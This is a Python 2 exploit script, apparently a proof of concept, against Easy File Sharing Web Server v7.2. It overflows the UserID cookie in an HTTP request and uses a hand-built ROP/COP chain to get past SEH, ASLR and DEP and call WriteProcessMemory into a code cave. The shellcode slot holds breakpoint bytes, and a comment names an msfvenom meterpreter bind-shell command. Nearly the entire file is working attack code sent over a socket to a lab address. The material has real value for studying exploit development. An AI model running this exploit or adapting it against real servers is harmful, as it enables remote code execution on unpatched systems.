# Easy File Sharing Web Server v7.2 Remote Memory Corruption (SEH, ASLR, and DEP Bypass)
# kernel32!WriteProcessMemory
# .text section of sqlite3.dll dependency @ address 61C72530 is a code cave
# Author Connor McGarr (@330yre)
# https://connormcgarr.github.io
# ROP'd this badboy by hand- sorry mona.
# In muts we trust.
import sys
import os
import socket
import struct

# 4063 byte SEH offset
# Stack pivot lands at padding buffer to SEH at offset 2563
crash = "\x90" * 2563
print "[+] Beginning ROP chain. Wish us luck..."

# Stack pivot lands here
# Beginning ROP chain

# Saving address near ESP for relative calculations into EAX and ECX
# EBP is near stack address
crash += struct.pack('<L', 0x61c05e8c)		# xchg eax, ebp ; ret: sqlite3.dll (non-ASLR enabled module)

# EAX is now 0xfec bytes away from ESP. We want current ESP + 0x28 (to compensate for loading EAX into ECX eventually) into EAX
# Popping negative ESP + 0x28 into ECX and subtracting from EAX
# EAX will now contain a value at ESP + 0x24 (loading ESP + 0x24 into EAX, as this value will be placed in EBP eventually. EBP will then be placed into ESP- which will compensate for ROP gadget which moves EAX into EAX vai "leave")
crash += struct.pack('<L', 0x10018606)		# pop ecx, ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xffffefe8)		# Negative ESP + 0x28 offset
crash += struct.pack('<L', 0x1001283e)		# sub eax, ecx ; ret: ImageLoad.dll (non-ASLR enabled module)

# Loading EAX into ECX

# This gadget is to get EBP equal to EAX (which is further down on the stack) - due to the mov eax, ecx ROP gadget that eventually will occur.
# Said ROP gadget has a "leave" instruction, which will load EBP into ESP. This ROP gadget compensates for this gadget to make sure the stack doesn't get corrupted, by just "hopping" down the stack
# EAX and ECX will now equal ESP - 8 - which is good enough in terms of needing EAX and ECX to be "values around the stack"
crash += struct.pack('<L', 0x61c30547)		# add ebp, eax ; ret sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c6588d)		# mov ecx, eax ; mov eax, ecx ; add esp, 0x24 ; pop ebx ; leave ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget (pop ebx)
crash += struct.pack('<L', 0x90909090)		# Padding to compensate for above ROP gadget (pop ebp in leave instruction)

# Jumping over kernel32!WriteProcessMemory placeholder parameters
crash += struct.pack('<L', 0x10015eb4)		# add esp, 0x1c ; ret: ImageLoad.dll (non-ASLR enabled module)

# kernel32!WriteProcessMemory placeholder parameters
crash += struct.pack('<L', 0x61c832e4)		# Pointer to kernel32!WriteFile (no pointers from IAT directly to kernel32!WriteProcessMemory, so loading pointer to kernel32.dll and compensating later.)
crash += struct.pack('<L', 0x61c72530)		# Return address parameter placeholder (where function will jump to after execution- which is where shellcode will be written to. This is an executable code cave in the .text section of sqlite3.dll)
crash += struct.pack('<L', 0xFFFFFFFF)		# hProccess = handle to current process (Psuedo handle = 0xFFFFFFFF points to current process)
crash += struct.pack('<L', 0x61c72530)		# lpBaseAddress = pointer to where shellcode will be written to. (0x61C72530 is an executable code cade in the .text seciton of sqlite3.dll) 
crash += struct.pack('<L', 0x11111111)		# lpBuffer = base address of shellcode (dynamically generated)
crash += struct.pack('<L', 0x22222222)		# nSize = size of shellcode 
crash += struct.pack('<L', 0x1004D740)		# lpNumberOfBytesWritten = writeable location (.idata section of ImageLoad.dll address in a code cave)

# Jump over parameters lands here

# Starting with lpBuffer (shellcode location)
# ECX currently points to lpBuffer placeholder parameter location - 0x18
# Moving ECX 8 bytes before EAX, as the gadget to overwrite dword ptr [ecx] overwrites it at an offset of ecx+0x8
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001dacc)		# inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)

# Pointing EAX (shellcode location) to data inside of ECX (lpBuffer placeholder) (NOPs before shellcode)
crash += struct.pack('<L', 0x1001fce9)		# pop esi ; add esp + 0x8 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffffddc)		# Shellcode is about negative 0xfffffddc bytes away from EAX
crash += struct.pack('<L', 0x90909090)		# Compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Compensate for above ROP gadget
crash += struct.pack('<L', 0x10022f45)		# sub eax, esi ; pop edi ; pop esi ; ret
crash += struct.pack('<L', 0x90909090)		# Compensate for above ROP gadget
crash += struct.pack('<L', 0x90909090)		# Compensate for above ROP gadget

# Changing lpBuffer placeholder to actual address of shellcode
crash += struct.pack('<L', 0x10021bfb)		# mov dword [ecx+0x8], eax ; ret: ImageLoad.dll (non-ASLR enabled module)

# nSize parameter (0x180 = 384 bytes)
crash += struct.pack('<L', 0x100103ff)		# pop edi ; ret: ImageLoad.dll (non-ASLR enabled module) (Compensation for COP gadget add edx, 0x20)
crash += struct.pack('<L', 0x1001c31e)		# add esp, 0x8 ; ret: ImageLoadl.dll (non-ASLR enabled module) (Returns to stack after COP gadget)
crash += struct.pack('<L', 0x10022c4c)		# xor edx, edx ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)

# Current ECX points to lpAddress - 0x8
# Incrementing ECX to place the nSize parameter placeholder into ECX
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)

# Pointing nSize parameter placeholder to actual value of 0x180 (in EDX)
crash += struct.pack('<L', 0x1001f5b4)		# mov dword ptr [ecx], edx

# ECX currently is located at kernel32!WriteProcessMemory parameter placeholder - 0x8
# Need to first extract sqlite3.dll pointer (which is a pointer to kernel32) and then calculate offset from kernel32!FormatMessageA

# First, decrementing ECX by 0x8
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)

# Extracting pointer into EAX
# First, putting pointer to kernel32 into EAX (add 0x2bc to EAX. EAX ix really 0x2c4 bytes away, but the only gadget to overwrite kernel32WriteProcessMemory parameter placeholder addes 8 to ECX first. This compensates for those 8 bytes)

# EDX contains a value of 0x180 from nSize parameter
# EDI still contains return to stack ROP gadget for COP gadget compensation
# EAX is 0x2bc bytes ahead of the kernel32!WriteProcessMemory parameter placeholder
# Subtracting 0x2bc from EAX via EDX register
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
crash += struct.pack('<L', 0x1001b884)		# add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)

# EDX is now 0x1c bytes away from the kernel32!WriteProcessMemory placeholder
# Incrementing EDX
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10020ed8) 		# inc edx, or bytes [ebx], bh ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x10015ce5)		# sub eax, edx ; ret: ImageLoad.dll (non-ASLR enabled module)

# Extracting kernel32!WriteProcessMemory parameter placeholder (sqlite3.dll pointer to kernel32!WriteFile)
# Need to then extract pointer to sqlite3.dll (need to dereference kernel32!WriteProcessMemory parameter placeholder twice)
# kernel32 pointer will now be in EAX
crash += struct.pack('<L', 0x1002248c)		# mov eax, dword [eax] ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x1002248c)		# mov eax, dword [eax] ; ret: ImageLoad.dll (non-ASLR enabled module)

# kernel32!WriteProcessMemory

# kernel32!WriteProcessMemory is negative 0xfffff56e bytes away from kernel32!FormatMessageA (which is in the virtual parameter placeholder currently)
# Popping 0xfffff56e into EBX (which will be transferred into EDX. After value is in EDX, it will be added to EAX via EDX)

# Preparing EDX by clearing it out
crash += struct.pack('<L', 0x10022c4c)		# xor edx, edx ; ret: ImageLoad.dll (non-ASLR enabled module)

# Beginning calculations for EBX
crash += struct.pack('<L', 0x100141c8)		# pop ebx ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0xfffebeb7)		# Negative distance to kernel32!WriteProcessMemory from kernel32!WriteFile

# Transferring EBX to EDX
crash += struct.pack('<L', 0x10022c1e)		# add edx, ebx ; pop ebx ; retn 0x10: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)		# Compensating for above ROP gadget

# Placing kernel32!WriteProcessMemory into EAX
crash += struct.pack('<L', 0x10015ce5)		# sub eax, edx ; ret: ImageLoad.dll (non-ASLR enabled module)

# ROP gadget compensations
crash += struct.pack('<L', 0x90909090)		# Compensation for retn 0x10 in previous ROP gadget
crash += struct.pack('<L', 0x90909090)		# Compensation for retn 0x10 in previous ROP gadget
crash += struct.pack('<L', 0x90909090)		# Compensation for retn 0x10 in previous ROP gadget
crash += struct.pack('<L', 0x90909090)		# Compensation for retn 0x10 in previous ROP gadget

# After negative math to obtain kernel32!WriteProcessMemory address, EAX still needs to be decremented 0x20 bytes
crash += struct.pack('<L', 0x10022897)		# sub eax, 0x20 ; ret: ImageLoadl.dll (non-ASLR enabled module)

# Writing kernel32!WriteProcessMemory address to kernel32!WriteProcessMemory parameter placeholder (ECX - 0xc)s

# ECX = kernel32!WriteProcessMemory parameter placeholder + 0xC
# Decrementing ECX by 0x18 firstly (parameter is 0xc bytes in front of ECX. Subtracting ECX by 0xC to place placeholder in ECX. Additionally, the overwrite gadget writes to ECX at an offset of ECX+0x8. Adding 0x8 more bytes to compensate.)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c27d1b)		# dec ecx ; ret: sqlite3.dll (non-ASLR enabled module)

# Overwriting kernel32!WriteProcessMemory parameter placeholder with actual address of kernel32!WriteProcessMemory
crash += struct.pack('<L', 0x10021bfb)		# mov dword [ecx+0x8], eax ; ret: ImageLoad.dll (non-ASLR enabled module)

# The goal now is to load the address pointing to kernel32!WriteProcessMemory in ESP
# ECX contains an address + 0x8 bytes behind the kernel32!WriteProcessMemory pointer on the stack
# Increasing ECX by 8 bytes, moving it into EAX, and then exchanging EAX with ESP to fire off the ROP chain!
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x61c68081)		# inc ecx ; add al, 0x39 ; ret: ImageLoad.dll (non-ASLR enabled module)

# Moving ECX into EAX
crash += struct.pack('<L', 0x1001fa0d)		# mov eax, ecx ; ret: ImageLoad.dll (non-ASLR enabled module)

# Exchanging EAX with ESP to fire off the call to kernel32!WriteProcessMemory
crash += struct.pack('<L', 0x61c07ff8)		# xchg eax, esp ; ret: sqlite3.dll (non-ASLR enabled module)

# Arbitrary amount of NOPs before shellcode
crash += "\x90" * 100

# msfvenom -p windows/meterpreter/bind_tcp LPORT=9999 -b "\x00\x0a\x0d" -f python -v
# 336 bytes (about 0x170)
crash += "\xCC" * 336

# 4063 total offset to SEH
crash += "\x41" * (4063-len(crash))

# SEH only- no nSEH because of DEP
# Stack pivot to return to buffer
crash += struct.pack('<L', 0x10022869)		# add esp, 0x1004 ; ret: ImageLoad.dll (non-ASLR enabled module)

# 5000 total bytes for crash
crash += "\x41" * (5000-len(crash))

# Replicating HTTP request to interact with the server
# UserID contains the vulnerability
http_request = "GET /changeuser.ghp HTTP/1.1\r\n"
http_request += "Host: 172.16.55.140\r\n"
http_request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
http_request += "Accept-Language: en-US,en;q=0.5\r\n"
http_request += "Accept-Encoding: gzip, deflate\r\n"
http_request += "Referer: http://172.16.55.140/\r\n"
http_request += "Cookie: SESSIONID=9349; UserID=" + crash + "; PassWD=;\r\n"
http_request += "Connection: Close\r\n"
http_request += "Upgrade-Insecure-Requests: 1\r\n"

print "[+] Sending exploit..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.197.135", 80))
s.send(http_request)
s.close()
